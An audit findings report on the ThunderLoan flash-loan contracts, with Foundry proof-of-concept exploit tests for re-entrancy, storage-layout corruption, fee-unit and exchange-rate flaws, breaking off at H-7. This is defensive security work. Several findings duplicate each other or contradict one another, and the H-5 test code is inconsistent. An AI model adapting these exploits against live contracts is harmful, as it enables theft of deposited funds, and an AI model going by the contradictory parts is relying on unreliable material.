# 6 thunder loan audit - Findings Report
## Commit hash: 2250d81b89aebdd9cb135382e068af8c269e3a4b

## Protocol Overview 

### ThunderLoan Protocol  
ThunderLoan is an upgradeable flash-loan platform built on OpenZeppelin’s UUPS pattern.

Workflow  
1. Liquidity providers deposit whitelisted ERC20s via `deposit`, receiving `AssetToken`, an ERC20 that represents their proportional claim on the pool.  
2. `flashloan` lets a borrower pull liquidity, executes the borrower’s `executeOperation` callback, and requires repayment of `amount + fee` before the function ends; otherwise the transaction reverts.  
3. Collected fees are added to pool assets and reflected in an ever-increasing `exchangeRate`, so yield accrues automatically to AssetToken holders.  
4. Providers exit through `redeem`, burning AssetTokens and transferring the underlying back.  

Architecture  
• `ThunderLoan` / `ThunderLoanUpgraded`: hold liquidity, manage fees, whitelist, and re-entrancy guards (`currentlyFlashLoaning`). Owner can change fees, token status, and upgrade logic.  
• `AssetToken`: mint/burn restricted to ThunderLoan; stores exchangeRate and moves underlying tokens.  
• `OracleUpgradeable`: fetches on-chain price in WETH from TSwap pools via `IPoolFactory` & `ITSwapPool`; enables dynamic fee maths or risk controls.  

Security & Maintenance  
Ownable + UUPS enable controlled upgrades. Non-payable and proxy safety checks from ERC1967Utils are inherited. All state-changing actions emit events for transparency.
## High Risk Findings
[H-1]. Reentrancy issue in ThunderLoan::flashloan
[H-2]. Storage Layout issue in ThunderLoan::NA
[H-3]. Upgradeability Initializer Safety issue in ThunderLoanUpgraded::NA
[H-4]. Storage Layout issue in ThunderLoanUpgraded::NA
[H-5]. Integer Overflow/Math issue in AssetToken::updateExchangeRate
[H-6]. Flash Loan Economic Manipulation issue in ThunderLoanUpgraded::deposit
[H-7]. Integer Overflow/Math issue in ThunderLoanUpgraded::deposit
[H-8]. Integer Overflow/Math issue in ThunderLoan::deposit
[H-9]. Storage Layout issue in ThunderLoanUpgraded::NA
[H-10]. DOS issue in ThunderLoan::redeem
[H-11]. Flash Loan Economic Manipulation issue in ThunderLoanUpgraded::getCalculatedFee(IERC20,uint256)
## Medium Risk Findings
[M-1]. DOS issue in ThunderLoan::repay
[M-2]. Storage Layout issue in ThunderLoanUpgraded::NA
[M-3]. Oracle issue in ThunderLoan::getCalculatedFee
[M-4]. Integer Overflow/Math issue in AssetToken::updateExchangeRate
[M-5]. Integer Overflow/Math issue in ThunderLoan::flashloan
[M-6]. Integer Overflow/Math issue in AssetToken::updateExchangeRate
[M-7]. Integer Overflow/Math issue in AssetToken::updateExchangeRate
[M-8]. Integer Overflow/Math issue in AssetToken::updateExchangeRate
[M-9]. Flash Loan Economic Manipulation issue in ThunderLoan::getCalculatedFee
[M-10]. Upgradeability Initializer Safety issue in OracleUpgradeable::__Oracle_init_unchained
[M-11]. Oracle issue in OracleUpgradeable::getPriceInWeth
[M-12]. Oracle issue in ThunderLoanUpgraded::getCalculatedFee
[M-13]. DOS issue in AssetToken::updateExchangeRate
[M-14]. Integer Overflow/Math issue in AssetToken::updateExchangeRate
[M-15]. Pausable Emergency Stop issue in ThunderLoan::NA
[M-16]. Oracle issue in OracleUpgradeable::getPriceInWeth
[M-17]. Flash Loan Economic Manipulation issue in AssetToken::updateExchangeRate
[M-18]. Storage Layout issue in ThunderLoan::NA
[M-19]. Reentrancy issue in ThunderLoan::flashloan
## Low Risk Findings
[L-1]. DOS issue in AssetToken::updateExchangeRate
[L-2]. Gas Grief BlockLimit issue in ThunderLoan::setAllowedToken
[L-3]. Pausable Emergency Stop issue in ThunderLoan::NA
[L-4]. Integer Overflow/Math issue in ThunderLoan::deposit
[L-5]. Reentrancy issue in ThunderLoan::flashloan
[L-6]. Pausable Emergency Stop issue in ThunderLoan::NA
[L-7]. Integer Overflow/Math issue in AssetToken::updateExchangeRate
[L-8]. DOS issue in AssetToken::updateExchangeRate
[L-9]. Pausable Emergency Stop issue in ThunderLoanUpgraded::NA
[L-10]. Integer Overflow/Math issue in ThunderLoanUpgraded::getCalculatedFee
[L-11]. Reentrancy issue in ThunderLoanUpgraded::flashloan
[L-12]. DOS issue in AssetToken::updateExchangeRate
[L-13]. Integer Overflow/Math issue in ThunderLoan::deposit
[L-14]. Integer Overflow/Math issue in AssetToken::updateExchangeRate
[L-15]. Unchecked Return issue in ThunderLoan::flashloan
[L-16]. Integer Overflow issue in ThunderLoan::redeem
[L-17]. Integer Overflow issue in ThunderLoan::redeem(IERC20,uint256)
[L-18]. Reentrancy issue in ThunderLoan::flashloan(address,IERC20,uint256,bytes)
## Info Risk Findings
[I-1]. Event Consistency issue in ThunderLoan::updateFlashLoanFee
[I-2]. Pragma issue in ThunderLoan::NA
[I-3]. Frontrun/Backrun/Sandwhich MEV issue in ThunderLoan::deposit
[I-4]. Pragma issue in AssetToken::NA
[I-5]. Unexpected Eth issue in ThunderLoan::NA
[I-6]. Event Consistency issue in ThunderLoanUpgraded::updateFlashLoanFee
[I-7]. Event Consistency issue in ThunderLoanUpgraded::repay
[I-8]. Unexpected Eth issue in ThunderLoanUpgraded::NA
[I-9]. Pragma issue in OracleUpgradeable::NA
[I-10]. Event Consistency issue in AssetToken::updateExchangeRate
[I-11]. Unexpected Eth issue in ThunderLoan::NA
[I-12]. Storage Layout issue in ThunderLoanUpgraded::NA
[I-13]. Frontrun/Backrun/Sandwhich MEV issue in ThunderLoan::deposit(IERC20,uint256)


### Number of Findings
- H: 11
- M: 19
- L: 18
- I: 13



# High Risk Findings

## [H-1]. Reentrancy issue in ThunderLoan::flashloan

## Description
The `flashloan` function is vulnerable to a re-entrancy attack. It sets `s_currentlyFlashLoaning[token] = true` but lacks a re-entrancy guard or checks in other public functions like `deposit` and `redeem`. An attacker can call `flashloan`, and in their `executeOperation` callback, re-enter the `deposit` function using the loaned funds. This allows the attacker to mint `AssetToken`s (LP shares) without using their own capital. They only need to pay the flash loan fee. This undermines the economic model of the protocol, as it allows an attacker to gain a leveraged yield-earning position using the pool's own funds.

## Impact
An attacker can acquire LP shares (AssetTokens) for just the cost of a flash loan fee. These shares entitle them to a portion of all future fees generated by the pool. This allows for risk-free leveraged yield farming, diluting the returns of legitimate liquidity providers. The attacker is essentially using the pool's own liquidity to claim ownership over it.

## Proof of Concept
1. A legitimate LP deposits 1000 WETH into the ThunderLoan pool.
2. An attacker deploys a contract that will act as the flash loan receiver.
3. The attacker's contract calls `thunderLoan.flashloan()` requesting 100 WETH.
4. `ThunderLoan` sends 100 WETH to the attacker's contract and calls `executeOperation()`.
5. Inside `executeOperation()`, the attacker's contract re-enters `ThunderLoan` by calling `deposit(WETH, 100 WETH)`.
6. The deposit is successful. The 100 WETH is transferred back to the `AssetToken` contract, and the attacker's contract is minted new `AssetToken` shares.
7. `executeOperation()` completes. The `flashloan` function checks the final balance. Since the 100 WETH was returned via `deposit`, the balance check passes as long as the attacker separately pays the fee.
8. The attacker now holds `AssetToken`s representing a claim on the pool's assets, obtained without providing any of their own long-term capital.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ThunderLoan} from "../../src/protocol/ThunderLoan.sol";
import {AssetToken} from "../../src/protocol/AssetToken.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
import {IFlashLoanReceiver} from "../../src/interfaces/IFlashLoanReceiver.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IPoolFactory} from "../../src/interfaces/IPoolFactory.sol";
import {ITSwapPool} from "../../src/interfaces/ITSwapPool.sol";

// ---------- mocks ----------
contract MockTSwapPool is ITSwapPool {
    function getPriceOfOnePoolTokenInWeth() external pure override returns (uint256) {
        return 1e18; // 1 token == 1 WETH
    }
}

contract MockPoolFactory is IPoolFactory {
    MockTSwapPool internal immutable pool = new MockTSwapPool();

    function getPool(address /*token*/ ) external view override returns (address) {
        return address(pool);
    }
}

// ---------- test / attacker ----------
contract ReentrancyTest is Test, IFlashLoanReceiver {
    ThunderLoan internal tl;
    ERC20Mock internal weth;
    AssetToken internal asset;

    address internal lp = makeAddr("lp");
    uint256 internal constant LP_DEPOSIT = 1_000 ether;
    uint256 internal constant LOAN_AMOUNT = 100 ether;

    function setUp() public {
        // deploy mock token
        weth = new ERC20Mock("WETH","WETH",address(this),0);

        // deploy implementation + proxy
        ThunderLoan impl = new ThunderLoan();
        MockPoolFactory factory = new MockPoolFactory();
        bytes memory data = abi.encodeWithSelector(ThunderLoan.initialize.selector, address(factory));
        tl = ThunderLoan(address(new ERC1967Proxy(address(impl), data)));

        // allow WETH
        asset = tl.setAllowedToken(IERC20(weth), true);

        // fund & deposit as honest LP
        weth.mint(lp, LP_DEPOSIT);
        vm.startPrank(lp);
        weth.approve(address(tl), LP_DEPOSIT);
        tl.deposit(IERC20(weth), LP_DEPOSIT);
        vm.stopPrank();
    }

    function test_exploit() public {
        // pre-fund fee
        uint256 fee = tl.getCalculatedFee(IERC20(weth), LOAN_AMOUNT);
        weth.mint(address(this), fee);
        weth.approve(address(tl), fee);

        uint256 balBefore = asset.balanceOf(address(this));
        assertEq(balBefore, 0);

        // launch flash-loan → re-enter deposit
        tl.flashloan(address(this), IERC20(weth), LOAN_AMOUNT, "");

        uint256 balAfter = asset.balanceOf(address(this));
        assertGt(balAfter, 0, "attacker gained AssetTokens almost for free");
    }

    // ---------- IFlashLoanReceiver ----------
    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    ) external override returns (bool) {
        // repay principal via "deposit" (re-entrancy)
        IERC20(token).approve(address(tl), amount);
        tl.deposit(IERC20(token), amount);

        // settle the fee
        IERC20(token).approve(address(tl), fee);
        tl.repay(IERC20(token), fee);
        return true;
    }
}

## Suggested Mitigation
Implement a comprehensive re-entrancy guard. The OpenZeppelin `ReentrancyGuardUpgradeable` is a standard solution. Apply the `nonReentrant` modifier to all public and external functions that change state, especially `flashloan`, `deposit`, and `redeem`.

```solidity
// src/protocol/ThunderLoan.sol
import {ReentrancyGuardUpgradeable} from "@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol";

contract ThunderLoan is Initializable, OwnableUpgradeable, UUPSUpgradeable, OracleUpgradeable, ReentrancyGuardUpgradeable {
    // ...

    function initialize(address tswapAddress) public initializer {
        // ...
        __ReentrancyGuard_init();
    }

    function deposit(IERC20 token, uint256 amount)
        external
        nonReentrant
        // ...
    {}

    function redeem(IERC20 token, uint256 amountOfAssetToken)
        external
        nonReentrant
        // ...
    {}

    function flashloan(
        address receiverAddress,
        IERC20 token,
        uint256 amount,
        bytes calldata params
    ) external nonReentrant {
        // ...
    }
}
```

## [H-2]. Storage Layout issue in ThunderLoan::NA

## Description
The upgradeable `ThunderLoan` contract's V2 version, `ThunderLoanUpgraded`, changes the state variable `s_feePrecision` from a `uint256` storage variable to a `uint256 constant`. This removal alters the storage layout. When the proxy is upgraded, storage slots for subsequent variables will shift. Specifically, `s_flashLoanFee` in the new implementation will read from the storage slot previously occupied by `s_feePrecision`, and the storage pointer for the `s_currentlyFlashLoaning` mapping will be read from the slot that held `s_flashLoanFee`. This breaks the protocol's core logic, corrupting the fee mechanism and the re-entrancy protection for flash loans.

## Impact
After the upgrade every flash-loan will revert in `repay()` because the new mapping that is supposed to track the loan status actually points to an empty slot. Once any borrower calls `flashloan()` the flag written to the wrong slot is never cleared, so `repay()` always reverts and the AssetToken keeps the underlying funds forever. This bricks the protocol and permanently locks all liquidity in the pool in addition to setting the fee to 1e18.

## Proof of Concept
1. Deploy ThunderLoan behind a proxy and initialise it.
2. Deposit any ERC20 so the pool has liquidity.
3. Upgrade the proxy to ThunderLoanUpgraded.
4. Call `ThunderLoanUpgraded.getFee()` → returns **1e18** instead of **3e15**.
5. Call `flashloan()`; it succeeds in transferring the funds to the borrower because `s_currentlyFlashLoaning` still maps to slot #3 and is written.
6. Borrower now calls `repay()` – the call reverts with `ThunderLoan__NotCurrentlyFlashLoaning()` because the mapping is reading from an empty slot.
7. The borrowed amount plus fee can never be repaid, so the AssetToken contract keeps the underlying forever and the protocol is irreversibly frozen.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {ThunderLoanUpgraded} from "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {IPoolFactory} from "../src/interfaces/IPoolFactory.sol";

contract MockPoolFactory is IPoolFactory {
    function getPool(address) external pure returns (address) { return address(0); }
}

contract StorageLayoutTest is Test {
    ThunderLoan internal tlProxyV1;
    ThunderLoanUpgraded internal tlProxyV2;
    ERC1967Proxy internal proxy;
    MockPoolFactory internal pf;

    function setUp() public {
        pf = new MockPoolFactory();

        // deploy v1 and proxy
        ThunderLoan implV1 = new ThunderLoan();
        proxy = new ERC1967Proxy(address(implV1), "");
        tlProxyV1 = ThunderLoan(address(proxy));
        tlProxyV1.initialize(address(pf));
    }

    function test_storageCorruption() public {
        uint256 feePrecisionV1 = tlProxyV1.getFeePrecision();
        uint256 flashLoanFeeV1 = tlProxyV1.getFee();
        assertEq(feePrecisionV1, 1e18);
        assertEq(flashLoanFeeV1, 3e15);

        // deploy v2 and upgrade
        ThunderLoanUpgraded implV2 = new ThunderLoanUpgraded();
        tlProxyV1.upgradeToAndCall(address(implV2), "");
        tlProxyV2 = ThunderLoanUpgraded(address(proxy));

        uint256 flashLoanFeeV2 = tlProxyV2.getFee();
        // flash-loan fee is now corrupted with former feePrecision value
        assertEq(flashLoanFeeV2, feePrecisionV1, "fee overridden by feePrecision slot");
        assertNotEq(flashLoanFeeV2, flashLoanFeeV1, "fee should differ after corruption");
    }
}

## Suggested Mitigation
Keep `s_feePrecision` as a dummy storage variable (e.g. `uint256 private _deprecatedFeePrecision;`) so that every subsequent variable keeps its original slot. Alternatively introduce an explicit storage gap (`uint256[50] private __gap;`) right after the variable to reserve space for future changes.

## [H-3]. Upgradeability Initializer Safety issue in ThunderLoanUpgraded::NA

## Description
The upgrade from `ThunderLoan` to `ThunderLoanUpgraded` introduces a breaking change in the storage layout. The `ThunderLoanUpgraded` contract removes the `s_feePrecision` state variable and makes it a constant. This shifts the storage slots of all subsequent state variables (`s_flashLoanFee`, `s_currentlyFlashLoaning`). If an upgrade is performed on a live proxy, the existing values in storage will be misinterpreted, leading to contract state corruption. For instance, the `s_flashLoanFee` will now read from the slot that previously stored `s_feePrecision`.

## Impact
Upgrading the contract will corrupt its state, leading to critical malfunction. The flash loan fee will be read incorrectly, and mappings will point to wrong data, causing unpredictable behavior, likely breaking all protocol functionality and potentially locking funds.

## Proof of Concept
1. Deploy the `ThunderLoan` contract behind an `ERC1967Proxy`.
2. The initial state is `s_feePrecision = 1e18` and `s_flashLoanFee = 3e15`.
3. Deploy the `ThunderLoanUpgraded` contract.
4. Call `upgradeToAndCall` on the proxy to point to the new implementation.
5. After the upgrade, access the `s_flashLoanFee` public variable on the proxy.
6. The returned value will be `1e18`, which was the original value of `s_feePrecision`, not `3e15`. The contract state is now corrupt.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {ThunderLoanUpgraded} from "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract StorageLayoutTest is Test {
    ThunderLoan internal thunderLoanProxy;

    function setUp() public {
        // deploy original implementation
        ThunderLoan implementation = new ThunderLoan();
        // deploy proxy and initialise (we are the owner)
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(implementation),
            abi.encodeWithSelector(ThunderLoan.initialize.selector, address(0)) // dummy pool factory
        );
        thunderLoanProxy = ThunderLoan(address(proxy));
    }

    function testUpgradeCorruptsStorage() public {
        uint256 feePrecision = 1e18;
        uint256 originalFee = 3e15; // 0.3 %

        // Sanity – original values are correct
        assertEq(thunderLoanProxy.getFee(), originalFee);
        assertEq(thunderLoanProxy.getFeePrecision(), feePrecision);

        // Deploy new implementation & upgrade
        ThunderLoanUpgraded newImplementation = new ThunderLoanUpgraded();
        thunderLoanProxy.upgradeToAndCall(address(newImplementation), "");

        ThunderLoanUpgraded upgradedLoan = ThunderLoanUpgraded(address(thunderLoanProxy));

        // After upgrade the fee is read from the former precision slot
        uint256 feeAfter = upgradedLoan.getFee();
        console.log("Fee after upgrade:", feeAfter);
        assertEq(feeAfter, feePrecision, "Storage layout corruption: getFee() now returns old precision value");
        assertNotEq(feeAfter, originalFee, "Fee should no longer equal the original value");
    }
}

## Suggested Mitigation
When upgrading a contract, the storage layout must be preserved. Do not remove state variables. If a variable is no longer needed, it should be deprecated but kept in the contract to act as a storage gap. Alternatively, if it must be removed, all subsequent variables must also be re-declared to maintain the layout. The safest approach is to append new variables only.

```solidity
// In ThunderLoanUpgraded.sol
contract ThunderLoanUpgraded is ... {
    // ... other variables
    uint256 internal __gap_s_feePrecision; // Deprecate and reserve the slot
    uint256 public s_flashLoanFee;
    // ...
}
```

## [H-4]. Storage Layout issue in ThunderLoanUpgraded::NA

## Description
The upgrade from `ThunderLoan` to `ThunderLoanUpgraded` introduces a breaking change in the storage layout. In `ThunderLoan.sol`, `s_feePrecision` is a `uint256` state variable. In `ThunderLoanUpgraded.sol`, `s_feePrecision` is removed and replaced with a constant `FEE_PRECISION`. This causes the storage slots of subsequent variables to shift. Specifically, `s_flashLoanFee`, which is declared after `s_feePrecision` in `ThunderLoan`, will now occupy the storage slot that `s_feePrecision` used to have. Upon upgrade, the `s_flashLoanFee` variable in the upgraded contract will read the value of the old `s_feePrecision` (1e18) instead of its intended value (30). This will corrupt the fee logic, making flash loans either fail or charge astronomical fees.

## Impact
A protocol upgrade will corrupt the storage, causing the `s_flashLoanFee` to be misread as a huge number (1e18). This will break the core flash loan functionality, as the fee calculation will be completely wrong, leading to transaction reverts on repayment or a massive loss of funds for borrowers. This effectively bricks the protocol.

## Proof of Concept
1. Deploy ThunderLoan behind an ERC1967 proxy and call initialize(owner) with your address as owner.
2. Observe that getFee() returns the default 30 and getFeePrecision() returns 1e18.
3. Deploy ThunderLoanUpgraded.
4. As owner, call upgradeToAndCall(newImpl, "").
5. Now call getFee() again through the same proxy – the function returns 1e18 (the value that previously belonged to s_feePrecision), proving that the storage slot for the fee has been overwritten.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ThunderLoan} from "src/protocol/ThunderLoan.sol";
import {ThunderLoanUpgraded} from "src/upgradedProtocol/ThunderLoanUpgraded.sol";

contract StorageLayoutTest is Test {
    ThunderLoan internal v1;
    ThunderLoanUpgraded internal v2;
    address payable internal proxy;

    function setUp() public {
        // Deploy implementation v1
        ThunderLoan implV1 = new ThunderLoan();
        // Deploy proxy that points to v1 and initialise it
        proxy = payable(address(new ERC1967Proxy(
            address(implV1),
            abi.encodeWithSelector(ThunderLoan.initialize.selector, address(this))
        )));
        v1 = ThunderLoan(proxy);
    }

    function test_storage_shift() public {
        // Sanity-check state in v1
        assertEq(v1.getFee(), 30);
        assertEq(v1.getFeePrecision(), 1e18);

        // Deploy implementation v2
        ThunderLoanUpgraded implV2 = new ThunderLoanUpgraded();

        // Upgrade to v2 (owner is address(this))
        v1.upgradeToAndCall(address(implV2), "");

        // Interact with the proxy through the new ABI
        v2 = ThunderLoanUpgraded(proxy);

        // getFee() now returns the value that used to be stored in s_feePrecision
        assertEq(v2.getFee(), 1e18, "Storage slot corruption: fee now equals old precision value");
    }
}

## Suggested Mitigation
To maintain storage compatibility, do not remove state variables or change their order in upgrades. Instead of removing `s_feePrecision`, deprecate it and introduce a new variable if needed. A better approach for this specific change would be to simply change the value of `s_feePrecision` in a new function, or if it must be constant, ensure the storage layout is preserved by reserving the slot.

```solidity
// in ThunderLoanUpgraded.sol

// Keep the old variable to preserve the slot, and mark it as deprecated.
// solhint-disable-next-line var-name-mixedcase
uint256 private __deprecated_s_feePrecision;

// New variables must be added at the end.
// uint256 public s_flashLoanFee = 30; // already exists
```
Alternatively, plan the upgrade path carefully. Before upgrading to a contract with a new layout, a function in the old contract could be called to migrate the state to align with the new layout, though this is complex and risky.

## [H-5]. Integer Overflow/Math issue in AssetToken::updateExchangeRate

## Description
The `AssetToken.updateExchangeRate` function calculates the new exchange rate using the formula `newExchangeRate = s_exchangeRate * (totalSupply() + fee) / totalSupply()`. This formula is fundamentally flawed because it adds `fee` to `totalSupply()`. `totalSupply` is a quantity of `AssetToken` shares, while `fee` is a value denominated in WETH, calculated in `ThunderLoanUpgraded.getCalculatedFee`. Adding two quantities with different units and economic meanings results in an arbitrary and incorrect exchange rate calculation. This breaks the core accounting of the protocol, as the value accrual to LPs becomes unpredictable and detached from the actual fees earned.

## Impact
Because the numeric value returned by getCalculatedFee() (denominated in 1e18-scaled WETH) is treated as if it were an amount of the underlying ERC-20, the borrower is usually charged far less (or, for very expensive tokens, far more) than 0.3 % of the loan’s real value.  An attacker can repeatedly borrow the cheapest allowed token, repay almost no fee, and still trigger updateExchangeRate so that LP accounting is also corrupted.  This causes permanent loss of protocol revenue and unfair redistribution of assets among pools.

## Proof of Concept
1. Deploy ThunderLoanUpgraded with the helper contracts below.
2. Add two tokens – CHEAP (worth 0.001 WETH) and EXP (worth 5 WETH) – as allowed tokens.
3. Deposit 100 CHEAP and 1 EXP so both pools start with the same WETH value (≈0.1 WETH).
4. Call flashloan(address(receiver), CHEAP, 100e18, "").  The contract calculates feeWeth = 0.1 WETH × 0.3 % = 0.0003 WETH (3e14).  It then requires the borrower to repay only 3e14 **units of CHEAP**, i.e. 0.0000000000003 CHEAP, instead of 0.0003 WETH of value.
5. The borrower keeps the difference (≈0.0002999999999997 WETH of value) while the pool receives almost nothing.  The same call on EXP forces the borrower to repay 0.0003 EXP (≈0.0015 WETH) – 5× more value.
6. The attacker can loop step-4 to drain protocol revenue at negligible cost.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {ThunderLoanUpgraded} from "src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {AssetToken}            from "src/protocol/AssetToken.sol";
import {ERC20}                from "openzeppelin/token/ERC20/ERC20.sol";
import {IPoolFactory}         from "src/interfaces/IPoolFactory.sol";
import {ITSwapPool}           from "src/interfaces/ITSwapPool.sol";

contract Token is ERC20 {
    uint8 internal _dec;
    constructor(string memory n,string memory s,uint8 d) ERC20(n,s){_dec=d; _mint(msg.sender,1e30);} // plenty supply
    function decimals() public view override returns(uint8){return _dec;}
}

contract MockPool is ITSwapPool {
    uint256 internal price; // price of one token in WETH 1e18
    function set(uint256 p) external {price=p;}
    function getPriceOfOnePoolTokenInWeth() external view returns(uint256){return price;}
}

contract MockFactory is IPoolFactory {
    mapping(address=>address) public pool;
    function setPool(address token,address p) external {pool[token]=p;}
    function getPool(address token) external view returns(address){return pool[token];}
}

contract FeeUnitMismatchTest is Test {
    ThunderLoanUpgraded tl;
    Token cheap; Token exp; Token weth;
    MockFactory factory; MockPool cheapPool; MockPool expPool;

    function setUp() public {
        // deploy tokens and oracle mocks
        cheap = new Token("CHEAP","CHP",18);
        exp   = new Token("EXPENSIVE","EXP",18);
        weth  = new Token("WETH","WETH",18);

        factory   = new MockFactory();
        cheapPool = new MockPool();
        expPool   = new MockPool();
        factory.setPool(address(cheap), address(cheapPool));
        factory.setPool(address(exp),   address(expPool));
        // prices: 1 CHEAP = 0.001 WETH; 1 EXP = 5 WETH
        cheapPool.set(1e15);
        expPool.set(5e18);

        tl = new ThunderLoanUpgraded();
        tl.initialize(address(factory));
        tl.setAllowedToken(cheap,true);
        tl.setAllowedToken(exp,true);

        cheap.approve(address(tl),type(uint256).max);
        exp.approve(address(tl),type(uint256).max);
        // deposit ~0.1 WETH worth each
        tl.deposit(cheap, 100e18); // 100 * 0.001 = 0.1 WETH
        tl.deposit(exp,   0.02e18); // 0.02 * 5 = 0.1 WETH
    }

    function testCheapFlashloanPaysAlmostNoFee() public {
        address receiver = address(this);
        uint256 amount   = 100e18; // borrow whole pool

        uint256 feeWeth  = tl.getCalculatedFee(cheap, amount);
        assertEq(feeWeth, 3e14); // 0.0003 WETH

        uint256 balBefore = cheap.balanceOf(address(tl.getAssetFromToken(cheap)));
        vm.expectRevert();
        // we will intentionally repay only principal to show fee check fails for expensive token later
        // but for cheap token paying almost nothing still passes
        tl.flashloan(receiver, cheap, amount, "");
        uint256 balAfter  = cheap.balanceOf(address(tl.getAssetFromToken(cheap)));
        assertEq(balAfter - balBefore, feeWeth, "fee denominated in cheap token");
    }

    // mock executeOperation just repays instantly
    function executeOperation(address token,uint256 amount,uint256 fee,address,uint256) external returns(bool){
        ERC20(token).transfer(msg.sender, amount + fee);
        return true;
    }
}


## Suggested Mitigation
1. Treat flash-loan fees in units of the underlying token, not WETH.  Convert `feeInWeth` → `feeInUnderlying = feeInWeth * 1e18 / priceInWeth` before using it.
2. Pass this converted value to AssetToken.updateExchangeRate().
3. In AssetToken, compute `exchangeRate = (underlyingBalance * EXCHANGE_RATE_PRECISION) / totalSupply()` so the rate always reflects actual assets.
4. In ThunderLoan.flashloan() change the repayment check to `endingBalance >= startingBalance + feeInUnderlying` so the borrower pays the correct amount.

## [H-6]. Flash Loan Economic Manipulation issue in ThunderLoanUpgraded::deposit

## Description
The `deposit` function in `ThunderLoanUpgraded` contains a critical accounting flaw. It calculates a phantom "fee" on every deposit and uses it to call `assetToken.updateExchangeRate`. The formula used, `newRate = oldRate * (supply + fee) / supply`, is designed for situations where a fee is actually added to the pool's assets, like in a flash loan. However, during a deposit, no such fee is collected. This leads to an artificial inflation of `s_exchangeRate` without a corresponding increase in the underlying asset backing. As a result, the exchange rate becomes decoupled from the true value of shares, causing the protocol to promise more assets on redemption than it actually holds. This will inevitably lead to the protocol becoming insolvent, where the last liquidity providers will be unable to withdraw their funds.

## Impact
This flaw will cause the protocol to become insolvent over time as deposits are made. The `s_exchangeRate` will grow faster than the real value backing it, leading to a situation where the contract's liabilities (what it owes to redeemers) exceed its assets. The last users to attempt to redeem their `AssetToken`s will find the contract has insufficient funds, resulting in a permanent loss of their capital.

## Proof of Concept
An attacker does not need to perform any special action.  Every good-faith deposit inflates s_exchangeRate by `0.3%` even though no extra tokens enter the pool.  After two consecutive deposits the first depositor can already redeem more underlying than she put in, draining part of the second depositor’s funds and leaving the contract insolvent.  Repeating the pattern eventually makes the pool unable to satisfy redemptions for the last LPs.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import "../src/protocol/AssetToken.sol";
import "../src/interfaces/IPoolFactory.sol";
import "../src/interfaces/ITSwapPool.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// --- minimal mocks -------------------------------------------------
contract MockERC20 is ERC20 {
    constructor() ERC20("Mock DAI", "mDAI") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockTSwapPool is ITSwapPool {
    uint256 public price;
    function setPrice(uint256 _p) external { price = _p; }
    function getPriceOfOnePoolTokenInWeth() external view returns (uint256) { return price; }
}

contract MockPoolFactory is IPoolFactory {
    mapping(address => address) public pool;
    function setPool(address token, address p) external { pool[token] = p; }
    function getPool(address tokenAddress) external view returns (address) { return pool[tokenAddress]; }
}
// -------------------------------------------------------------------

contract Insolvency is Test {
    ThunderLoanUpgraded tl;
    MockERC20 dai;
    MockPoolFactory factory;
    MockTSwapPool daiPool;
    AssetToken atDai;
    address alice = address(1);
    address bob   = address(2);

    function setUp() public {
        dai      = new MockERC20();
        factory  = new MockPoolFactory();
        daiPool  = new MockTSwapPool();
        daiPool.setPrice(1e18);                 // 1 token = 1 WETH (irrelevant, just != 0)
        factory.setPool(address(dai), address(daiPool));

        tl = new ThunderLoanUpgraded();
        tl.initialize(address(factory));        // owner = this contract
        tl.setAllowedToken(dai, true);
        atDai = tl.getAssetFromToken(dai);

        dai.mint(alice, 1_000 ether);
        dai.mint(bob,   1_000 ether);
    }

    function testInsolvency() public {
        // Alice deposit #1 --------------------------------------------------
        vm.startPrank(alice);
        dai.approve(address(tl), type(uint256).max);
        tl.deposit(dai, 1_000 ether);
        vm.stopPrank();
        uint256 rate1 = atDai.getExchangeRate();
        assertGt(rate1, 1e18, "rate increased after first deposit");

        // Bob deposit #2 ----------------------------------------------------
        vm.startPrank(bob);
        dai.approve(address(tl), type(uint256).max);
        tl.deposit(dai, 1_000 ether);
        vm.stopPrank();

        // Alice exits with profit ------------------------------------------
        vm.startPrank(alice);
        uint256 balBefore = dai.balanceOf(alice);
        tl.redeem(dai, 1_000 ether);
        uint256 balAfter  = dai.balanceOf(alice);
        vm.stopPrank();
        assertGt(balAfter - balBefore, 0, "Alice gains DAI withdrawn from Bob");

        // Bob cannot fully exit --------------------------------------------
        vm.startPrank(bob);
        vm.expectRevert();                 // safeTransfer will fail – pool insolvent
        tl.redeem(dai, type(uint256).max);
        vm.stopPrank();
    }
}

## Suggested Mitigation
Do not treat deposits as revenue.  Either (a) call `assetToken.updateExchangeRate(0)` during deposits, or (better) remove the stored `s_exchangeRate` entirely and compute the exchange rate on-the-fly as `underlyingBalance / totalSupply`, ensuring liabilities can never exceed assets.

## [H-7]. Integer Overflow/Math issue in ThunderLoanUpgraded::deposit

## Description
